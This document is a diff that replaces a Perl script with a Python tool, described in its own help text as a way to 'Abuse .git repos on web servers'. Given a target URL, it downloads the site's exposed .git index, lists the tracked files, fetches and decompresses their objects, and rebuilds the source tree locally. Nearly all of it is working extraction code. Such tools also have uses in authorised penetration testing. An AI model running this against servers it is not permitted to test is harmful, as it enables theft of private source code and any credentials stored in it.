@@ -1,145 +1,159 @@
-#!/usr/bin/perl
+#!/usr/bin/env python3
+import struct
+import binascii
+import sys
+import urllib.request
+import urllib.parse
+import hexdump
+import argparse
+import os
+import fnmatch
+import zlib
 
-use strict;
-use File::Path qw(make_path);
-use LWP::UserAgent;
-use File::Temp qw(tempfile tempdir);
-use Compress::Zlib qw(uncompress);
+def error(facility, logstr):
+	log("error", logstr)
+	exit(1)
 
-sub readtime
-{
-   my ($handle, $hashref) = @_;
+def log(facility, logstr):
+	if verbose or facility == "error":
+		print(f"[{facility}] {logstr}")
 
-   read $handle, my $rawtime, 8;
+# expects a file pointer to a downloaded index file
+# returns a dictionary of file entries
+def readindex(indexfile):
+	buffer = indexfile.read(12)
 
-   ( $hashref->{'lsb32'},
-     $hashref->{'nsec'} ) = unpack "NN", $rawtime;
-  
-   return $hashref;
-}
+	# Parse the header
+	(ident, version, objects) = struct.unpack(">4sLL", buffer)
 
-sub readindex
-{
-   my ($infile) = @_;
-   my $packindex;
-    
-   # read the header
-   read $infile, my $rawheader, 12;
-   my $header = {};
-   ($header->{'ident'}, $header->{'version'}, $header->{'entries'})
-      = unpack("a4NN", $rawheader);
+	if ident != b"DIRC":
+		error("index","Not a git index file")
+	if version not in range(2,3):
+		error("index",f"Unknown version of git index file: {version}")
 
-   die "Not a git index file" if ($header->{'ident'} ne "DIRC");
-   die "Unsupported version of git index" if ($header->{'version'} != 2);
+	entries=[]
 
-   my @index_entries = ();
+	for i in range(0, objects):
+		entry = {}
+		statinfo = {}
+		statinfo['ctime'] = struct.unpack(">LL", indexfile.read(8))
+		statinfo['mtime'] = struct.unpack(">LL", indexfile.read(8))
+		buffer = indexfile.read(24)
+		( statinfo['dev'], statinfo['inode'], statinfo['mode'],
+		  statinfo['uid'], statinfo['gid'], statinfo['size'] ) = \
+		  struct.unpack(">LLLLLL", buffer)
 
-   for (my $i=0; $i<$header->{'entries'}; $i++)
-   {
-      my $statinfo = {};
-      my $entry = {};
-      my $rawdata;
-      my %ctime = ();
-      my %mtime = ();
+		entry['statinfo'] = statinfo
+		entry['id'] = binascii.hexlify(indexfile.read(20))
+		entry['flags'] = struct.unpack(">H", indexfile.read(2))[0]
+		
+		namelength=(entry['flags'] & 0x7ff) + 1
+		entry['name'] = indexfile.read(namelength-1).decode()
+		
+		# deal with padding
+		indexfile.read(1)
+		indexfile.read((8 - ((namelength + 62) % 8))%8)
 
-      $statinfo->{'ctime'}=readtime($infile, \%ctime);
-      $statinfo->{'mtime'}=readtime($infile, \%ctime);
+		# Add to output list
+		entries.append(entry)
+	
+	return entries
 
-      # read the non-time fields
-      read $infile, $rawdata, 24; 
-      ( $statinfo->{'dev'}.
-        $statinfo->{'inode'}.
-        $statinfo->{'mode'}.
-        $statinfo->{'uid'}.
-        $statinfo->{'gid'}.
-        $statinfo->{'size'} ) = unpack "NNNNNN", $rawdata;
+# Manages a file - opens from cache or downloads to cache
+# cachepath is global, url is the full url of the file
+def opencachefile(url):
+	cacheurl=urllib.parse.urlparse(url)
+	cachename=f"{cachepath}{cacheurl.path}"	
+	filename=os.path.basename(cachename)
+	dirname=os.path.dirname(cachename)
+	handle=None
+	if os.path.exists(f"{cachepath}{cacheurl.path}"):
+		log("cache",f"{url} found in cache")
+		# we already have the file cached - use this 
+		handle=open(cachename,"rb")
+	else:
+		log("cache",f"Getting {url}")
+		# make sure there's a directory
+		if not os.path.exists(dirname):
+			os.makedirs(dirname)
+	
+		try:
+			urllib.request.urlretrieve(f"{url}", filename=cachename)
+		except urllib.error.HTTPError as e:
+			raise Exception(f"Server error: {e.code}")		
+		except urllib.error.URLError as e:
+			raise Exception(f"Couldn't connect: {e.reason}")		
+		else:
+			handle=open(cachename,"rb")
 
-      $entry->{'statinfo'}=$statinfo;
-      read $infile, $rawdata, 20; 
-      ( $entry->{'id'} ) = unpack "H*", $rawdata;
-      $packindex.=$rawdata;
-      read $infile, $rawdata, 2; 
-      ( $entry->{'flags'} ) = unpack "n", $rawdata;
-     
-      # Finally read name - it's length is the lower 11 bits of flags
-      my $namelength=($entry->{'flags'} & 0x7ff)+1;
+	return handle
 
-      # Pad it up to a multiple of 4
-      read $infile, $rawdata, $namelength + (8 - (($namelength + 62) % 8)) %8; 
-      ($entry->{'name'}) = unpack "a" . ($namelength-1), $rawdata;
-       
-      push(@index_entries, $entry);
-   }
-   return @index_entries;
-}
+parser = argparse.ArgumentParser(description="Abuse .git repos on web servers")
+parser.add_argument('--cache', help='Directory to cache downloaded files', nargs='?', default='.gitgrab')
+parser.add_argument('--verbose', action='store_true', help='Be verbose')
+parser.add_argument('--outdir',  help='Directory to store output', default=None)
+parser.add_argument('url', help='base URL of site')
+parser.add_argument('action', help='Action to perform: ls, download')
+parser.add_argument('files', help='list of file globs', nargs='*')
+args=parser.parse_args()
 
+verbose=args.verbose
+url=args.url
+outdir=args.outdir
 
-# First grab the database file
-my $target=$ARGV[0];
-my $giturl="http://$ARGV[0]/.git/index";
-my $ua=LWP::UserAgent->new;
-print "Target is: $giturl\n";
-$ua->agent("All Your File Are Belong To Us/1.0");
-my $request=HTTP::Request->new(GET => $giturl);
-my $result=$ua->request($request);
+urlcheck=urllib.parse.urlparse(args.url)
+if urlcheck.scheme not in ('http', 'https'):
+	raise Exception(f"URL scheme not supported: {urlcheck.scheme}")
 
-if ($result->status_line !~ /^200/)
-{
-   die "Could not find Git index file";
-}
+if outdir == None:
+	outdir=urlcheck.hostname
 
-my ($dbfileh, $dbfilen) = tempfile();
-print $dbfileh $result->content;
-close $dbfileh;
+# Set up cache
+cachepath=f"{args.cache}/{urlcheck.hostname}{urlcheck.path}"
+if not os.path.exists(cachepath):
+	os.makedirs(cachepath)
+if not os.path.exists(outdir):
+	os.makedirs(outdir)
 
-open(my $infile, "<", $dbfilen);
-binmode($infile);
+log("main","Parsing index file")
+try:
+	cachefile=opencachefile(f"{url}/.git/index")
+except Exception as e:
+	error("main",f"Could not obtain git index file: {e.args[0]}")
+entries=readindex(cachefile)
 
-print "Decoding index file\n";
-my @index_entries = readindex($infile);
-close($infile);
-unlink($dbfilen);
-my $server=$ARGV[0];
+if args.action == "ls":
+	for entry in entries:
+		print(entry['name'])
 
-# Now extract the files
-foreach my $entry (@index_entries)
-{
-   my $firsttwo=substr($entry->{'id'},0,2);
-   my $resthash=substr($entry->{'id'},2);
-   
-   my $file=".git/objects/" . $firsttwo . "/" . $resthash;
-   my $rawdata;
-   my $decompressed;
-   my $oh;
+if args.action == "download":
+	files=set()
+	for file in args.files:
+		outputfiles=fnmatch.filter([x['name'] for x in entries], file)
+		files=set().union(files,outputfiles)
+	log("download",f"Files to extract: {files}")
 
-   print "Extracting " . $entry->{'name'} . "\n";
+	for file in files:
+		# Get entry from entries
+		entry=list(filter(lambda x: x['name'] == file, entries))[0]
+		# Get hash directory
+		first=entry["id"][0:2].decode()
+		rest =entry["id"][2:].decode()
+		log("download",f"Extracting {entry['name']}")
+		try:
+			thisfile=opencachefile(f"{url}/.git/objects/{first}/{rest}")
+		except Exception as e:
+			log("download",f"Could not obtain git object file: {e.args[0]}")
+		# Now we have it we can compress the data (!)
+		decompressed=zlib.decompress(thisfile.read())
+		# Now write it to a file
 
-   my $giturl="http://$server/$file";
-   my $frequest=HTTP::Request->new(GET => $giturl);
-   my $fresult=$ua->request($frequest);
-   $rawdata=$fresult->content;
+		outfile=f"{outdir}/{entry['name']}"
+		if not os.path.exists(os.path.dirname(outfile)):
+			os.makedirs(os.path.dirname(outfile))
+		output=open(outfile,"wb")
+		type=decompressed[:5].decode()
+		data=decompressed[decompressed.find(b'\0')+1:]
+		output.write(data)
+		output.close()
 
-   # Make sure the path is there for the output
-   my $outputpath="output/" . $entry->{'name'};
-   $outputpath =~ s#/[^/]*$##g;
-   
-   make_path($outputpath);
-   open $oh, ">", "output/$entry->{'name'}";
-  
-   # Now decompress the data
-   $decompressed=uncompress($rawdata);
-   my $gitfile={};
-
-   ($gitfile->{'type'}) = substr($decompressed,0,5);
-   if ($gitfile->{'type'} ne "blob ")
-   {
-      print "Unknown git file type: $gitfile->{'type'}. Skipping\n";
-      next;
-   }
-   ($gitfile->{'size'}) = unpack "Z*", substr($decompressed,5);
-   ($gitfile->{'data'}) = substr($decompressed,length($gitfile->{'size'})+6);
-   
-   # And write it
-   print $oh $gitfile->{'data'};
-   close($oh);
-}
